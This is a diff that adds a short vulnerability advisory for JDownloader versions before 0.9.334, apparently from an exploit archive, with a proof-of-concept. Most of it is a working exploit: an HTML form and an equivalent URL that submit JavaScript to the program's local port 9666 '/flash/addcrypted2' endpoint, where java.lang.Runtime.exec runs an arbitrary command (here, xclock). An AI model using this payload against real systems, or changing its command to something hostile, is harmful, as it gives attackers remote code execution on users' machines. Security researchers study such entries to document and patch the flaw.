@@ -1,0 +1,29 @@
+source: http://www.securityfocus.com/bid/38143/info
+
+JDownloader is prone to a vulnerability that lets remote attackers execute arbitrary code.
+
+Attackers can exploit this issue to execute arbitrary code within the context of the affected webserver process.
+
+Versions prior to JDownloader 0.9.334 are vulnerable. 
+
+<form action="http://www.example.com:9666/flash/addcrypted2" method="post">
+<textarea name="jk">
+function f() {
+    var run = java.lang.Runtime.getRuntime();
+    run.exec('/usr/bin/xclock');
+
+    return '42';
+}
+&lt;/textarea&gt;
+<input type="hidden" name="passwords" value="invalid" />
+<input type="hidden" name="source" value="http://example.com/invalid" />
+<input type="hidden" name="crypted" value="invalid" />
+<input type="submit" value="CLICK" />
+</form>
+
+or:
+
+http://www.example.com:9666/flash/addcrypted2?jk=function+f()+%7B+var+run+%3D
++java.lang.Runtime.getRuntime()%3B+run.exec('%2Fusr%2Fbin%2Fxclock')%3B
++return+'42'%3B+%7D&passwords=invalid&source=http://example.com/invalid
+&crypted=invalid
